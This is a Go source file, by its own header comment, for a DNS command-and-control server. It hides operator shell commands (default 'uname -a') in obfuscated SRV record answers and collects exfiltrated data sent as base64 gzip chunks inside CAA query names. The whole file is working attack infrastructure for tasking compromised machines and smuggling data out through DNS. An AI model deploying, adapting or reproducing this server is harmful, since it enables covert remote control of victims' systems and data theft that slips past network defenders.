// Package main implements a DNS server for command and control (C2) communications.
package main

import (
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"os"
	"slices"
	"sort"
	"strconv"
	"strings"

	"github.com/miekg/dns"
)

var (
	priority uint16 = 1024
	port     uint16 = 5210
	command         = "uname -a"
)

func encode(s, key string) string {
	s = base64.StdEncoding.EncodeToString([]byte(s))

	// Inline reverse operation
	r := []rune(key)
	for i, j := 0, len(r)-1; i < len(r)/2; i, j = i+1, j-1 {
		r[i], r[j] = r[j], r[i]
	}
	dec := string(r)

	log.Printf("encode input=%q enc=%q dec=%q", s, key, dec)

	// Build replacement pairs for character substitution
	pairs := make([]string, 0, len(key)*2)
	for i, k := range key {
		pairs = append(pairs, string(k), string(dec[i]))
	}

	repl := strings.NewReplacer(pairs...)
	encoded := repl.Replace(s)
	encoded = strings.ReplaceAll(encoded, " ", "__")
	result := "_loc_." + encoded + ".local."

	log.Printf("encoded: %s", result)
	return result
}

// decode decompresses base64-encoded gzip content.
func decode(msg []byte) ([]byte, error) {
	log.Printf("decode: %s", msg)

	compressed, err := base64.StdEncoding.DecodeString(string(msg))
	if err != nil {
		return nil, err
	}

	z, err := gzip.NewReader(bytes.NewReader(compressed))
	if err != nil {
		return nil, err
	}

	defer func() {
		if err := z.Close(); err != nil {
			log.Printf("error closing gzip reader: %v", err)
		}
	}()

	return io.ReadAll(z)
}

func nameKey(s string) string {
	// Extract unique characters from DNS name to derive encryption key.
	// Example: _toletan._zamicrus.local
	s = strings.ReplaceAll(s, "_", "")
	s = strings.ReplaceAll(s, ".", "")
	s = strings.ReplaceAll(s, ".local", "")
	log.Printf("key name: %s", s)

	// Extract individual characters
	letters := make([]string, 0, len(s))
	for _, c := range s {
		letters = append(letters, string(c))
	}

	sort.Strings(letters)
	uniq := slices.Compact(letters)
	log.Printf("uniq key: %s", uniq)

	// Ensure we have at least 6 unique characters
	if len(uniq) < 6 {
		log.Printf("warning: insufficient unique characters (%d), padding key", len(uniq))
		// Pad with spaces to reach minimum length
		for len(uniq) < 6 {
			uniq = append(uniq, " ")
		}
	}

	return strings.Join(uniq[0:6], "") + " "
}

var buf = map[string][]byte{}

func handleRequest(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)

	for _, q := range r.Question {
		if q.Qtype == dns.TypeSRV {
			name := strings.TrimRight(q.Name, ".")
			// Respond with a SRV record for example.com
			log.Printf("name: %q", name)
			key := nameKey(name)
			log.Printf("sending: %q", command)
			srv := &dns.SRV{
				Hdr:      dns.RR_Header{Name: q.Name, Rrtype: dns.TypeSRV, Class: dns.ClassINET, Ttl: 3600},
				Priority: priority,
				Weight:   port,
				Port:     8080,
				Target:   encode(command, key),
			}
			m.Answer = append(m.Answer, srv)
		}
		if q.Qtype == dns.TypeCAA {
			log.Printf("content: %q", q.Name)

			caa := &dns.CAA{
				Hdr:   dns.RR_Header{Name: q.Name, Rrtype: dns.TypeCAA, Class: dns.ClassINET, Ttl: 3600},
				Value: "OK",
			}
			m.Answer = append(m.Answer, caa)

			parts := strings.Split(q.Name, ".")
			if len(parts) < 3 {
				log.Printf("invalid CAA query format: %q (expected at least 3 parts)", q.Name)
				continue
			}

			id := parts[0]
			total, err := strconv.Atoi(parts[1])
			if err != nil {
				log.Printf("unable to convert %q to int: %v", parts[1], err)
				continue
			}
			if total < 0 || total > 1048576 { // 1MB limit
				log.Printf("invalid total size %d, rejecting", total)
				continue
			}

			chunk := parts[2]
			buf[id] = append(buf[id], []byte(chunk)...)
			log.Printf("%d of %d: %s", len(buf[id]), total, chunk)

			// Prevent memory exhaustion
			if len(buf[id]) > total {
				log.Printf("buffer overflow for id %q, clearing", id)
				delete(buf, id)
				continue
			}

			if len(buf[id]) == total {
				content, err := decode(buf[id])
				log.Printf("decode %v: %s", err, content)
				delete(buf, id) // Clean up after decoding
			}
		}
	}
	if err := w.WriteMsg(m); err != nil {
		log.Printf("error writing DNS response: %v", err)
	}
}

func main() {
	dns.HandleFunc(".", handleRequest)

	p := "53"
	if len(os.Args) > 1 {
		p = os.Args[1]
	}
	if len(os.Args) > 2 {
		command = os.Args[2]
	}

	s := &dns.Server{Addr: ":" + p, Net: "udp"}
	fmt.Printf("Starting DNS server on port %s...\n", p)
	if err := s.ListenAndServe(); err != nil {
		log.Fatalf("Failed to start server: %v", err)
	}
}
